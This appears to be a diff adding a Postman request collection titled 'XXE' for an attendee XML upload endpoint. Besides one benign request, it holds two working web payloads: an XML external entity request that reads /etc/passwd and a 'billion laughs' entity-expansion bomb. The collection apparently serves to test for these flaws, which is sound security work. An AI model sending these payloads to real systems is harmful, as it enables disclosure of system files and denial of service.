@@ -1,0 +1,100 @@
+{
+	"info": {
+		"_postman_id": "729ffa78-099d-450c-a956-0b08e9cd0f0b",
+		"name": "XXE",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Attendee upload xml",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Accept",
+						"name": "Content-Type",
+						"type": "text",
+						"value": "text/xml",
+						"disabled": true
+					},
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "text/xml",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n<attendee>\r\n    <firstName>John</firstName>\r\n    <lastName>Smith</lastName>\r\n</attendee>"
+				},
+				"url": {
+					"raw": "{{host}}/upload-attendee-xml",
+					"host": [
+						"{{host}}"
+					],
+					"path": [
+						"upload-attendee-xml"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Attendee upload xml - XEE",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"type": "text",
+						"value": "text/xml"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n<!DOCTYPE x [\r\n<!ENTITY s SYSTEM \"/etc/passwd\">\r\n]>\r\n<attendee>\r\n    <firstName>John</firstName>\r\n    <lastName>Smith</lastName>\r\n    <description>&s;</description>\r\n</attendee>"
+				},
+				"url": {
+					"raw": "{{host}}/upload-attendee-xml",
+					"host": [
+						"{{host}}"
+					],
+					"path": [
+						"upload-attendee-xml"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Attendee upload xml - XML Bomb",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"type": "text",
+						"value": "text/xml"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\"?>\r\n<!DOCTYPE lolz [\r\n <!ENTITY lol \"lol\">\r\n <!ELEMENT lolz (#PCDATA)>\r\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\r\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\r\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\r\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\r\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\r\n <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\r\n <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\r\n <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\r\n <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\r\n]>\r\n<attendee>\r\n    <firstName>&lol9;</firstName>\r\n    <lastName>Smith</lastName>\r\n</attendee>"
+				},
+				"url": {
+					"raw": "{{host}}/upload-attendee-xml",
+					"host": [
+						"{{host}}"
+					],
+					"path": [
+						"upload-attendee-xml"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
